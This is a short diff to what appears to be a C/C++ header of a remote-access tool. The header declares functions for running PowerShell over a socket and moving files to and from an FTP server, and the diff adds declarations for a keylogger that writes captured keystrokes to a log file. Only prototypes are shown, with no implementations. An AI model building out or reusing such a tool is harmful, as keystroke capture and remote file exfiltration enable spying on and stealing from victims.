@@ -72,4 +72,8 @@ void execute_powershell(SOCKET socks_instance);
 int download_to_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass);
 int cd(char* path);
 int download_on_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass);
+void WriteLog(string filename, const char* key);
+void WriteLogChar(string filename, char key);
+int keylistener(string FILENAME_LOG, int key);
+int keylogger_spawn(string FILENAME_LOG);
 ```
